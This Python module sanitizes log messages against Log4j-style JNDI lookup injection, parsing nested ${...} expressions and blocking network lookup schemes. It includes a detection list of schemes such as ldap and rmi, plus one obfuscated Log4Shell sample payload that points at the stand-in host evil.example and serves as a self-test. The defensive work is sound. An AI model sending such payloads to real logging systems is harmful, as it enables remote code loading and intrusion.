"""Log4j-style JNDI lookup guard for issue #150.

The vulnerable pattern is passing attacker-controlled text to a custom logging
formatter that evaluates Log4j lookup expressions. A direct replacement for
``${jndi:...}`` is not enough because payloads can be case-mixed or assembled
from nested helper lookups such as ``${lower:j}``.

This module treats log messages as data: it never evaluates lookup syntax, it
parses balanced ``${...}`` expressions, and it replaces dangerous JNDI/network
lookup expressions with a stable marker before the message reaches the logger.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from typing import Iterable


BLOCKED_LOOKUP = "[blocked-log-lookup]"
_NETWORK_LOOKUP_SCHEMES = ("ldap", "ldaps", "rmi", "dns", "nis", "iiop", "corba")
_HELPER_LOOKUP_WORDS = (
    "lower",
    "upper",
    "env",
    "sys",
    "main",
    "date",
    "ctx",
    "map",
    "jvmrunargs",
    "docker",
    "k8s",
    "spring",
    "sd",
    "web",
)


@dataclass(frozen=True)
class LogSanitizationResult:
    original: str
    sanitized: str
    blocked_count: int

    @property
    def changed(self) -> bool:
        return self.original != self.sanitized


def sanitize_log_message(message: object) -> str:
    """Return a single-line log-safe message with JNDI lookups neutralized."""

    return sanitize_log_event(message).sanitized


def sanitize_log_event(message: object) -> LogSanitizationResult:
    """Sanitize an arbitrary log payload without evaluating lookup syntax."""

    original = _single_line(str(message))
    sanitized, blocked = _sanitize_lookup_expressions(original)
    return LogSanitizationResult(original=original, sanitized=sanitized, blocked_count=blocked)


def contains_dangerous_lookup(message: object) -> bool:
    """Return True if the text includes a dangerous Log4j-style lookup."""

    return sanitize_log_event(message).blocked_count > 0


def sanitize_many(messages: Iterable[object]) -> tuple[str, ...]:
    """Convenience wrapper for sanitizing a batch before structured logging."""

    return tuple(sanitize_log_message(message) for message in messages)


def _sanitize_lookup_expressions(text: str) -> tuple[str, int]:
    output: list[str] = []
    blocked = 0
    index = 0

    while index < len(text):
        if text.startswith("${", index):
            end = _find_lookup_end(text, index)
            if end is None:
                expression = text[index:]
                if _is_dangerous_lookup(expression):
                    output.append(BLOCKED_LOOKUP)
                    blocked += 1
                else:
                    output.append(expression.replace("${", "$\\{"))
                break

            expression = text[index : end + 1]
            if _is_dangerous_lookup(expression):
                output.append(BLOCKED_LOOKUP)
                blocked += 1
            else:
                output.append(expression)
            index = end + 1
            continue

        output.append(text[index])
        index += 1

    return "".join(output), blocked


def _find_lookup_end(text: str, start: int) -> int | None:
    depth = 0
    index = start
    while index < len(text):
        if text.startswith("${", index):
            depth += 1
            index += 2
            continue
        if text[index] == "}":
            depth -= 1
            if depth == 0:
                return index
        index += 1
    return None


def _is_dangerous_lookup(expression: str) -> bool:
    detection_key = _lookup_detection_key(expression)
    if "jndi" in detection_key:
        return True

    if not any(scheme in detection_key for scheme in _NETWORK_LOOKUP_SCHEMES):
        return False

    # If an expression includes a network lookup scheme and any nested/dynamic
    # lookup syntax, fail closed because the effective lookup key may be supplied
    # by another lookup such as ${env:LOOKUP}.
    return expression.count("${") > 1 or ":" in expression


def _lookup_detection_key(expression: str) -> str:
    lowered = expression.lower()
    key = re.sub(r"[^a-z0-9]", "", lowered)
    for word in _HELPER_LOOKUP_WORDS:
        key = key.replace(word, "")
    return key


def _single_line(value: str) -> str:
    safe: list[str] = []
    for char in value:
        codepoint = ord(char)
        if char == "\n":
            safe.append("\\n")
        elif char == "\r":
            safe.append("\\r")
        elif char == "\t":
            safe.append("\\t")
        elif codepoint < 32 or codepoint == 127:
            safe.append("?")
        else:
            safe.append(char)
    return "".join(safe)


if __name__ == "__main__":
    sample = "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.example/a}"
    print(sanitize_log_message(sample))
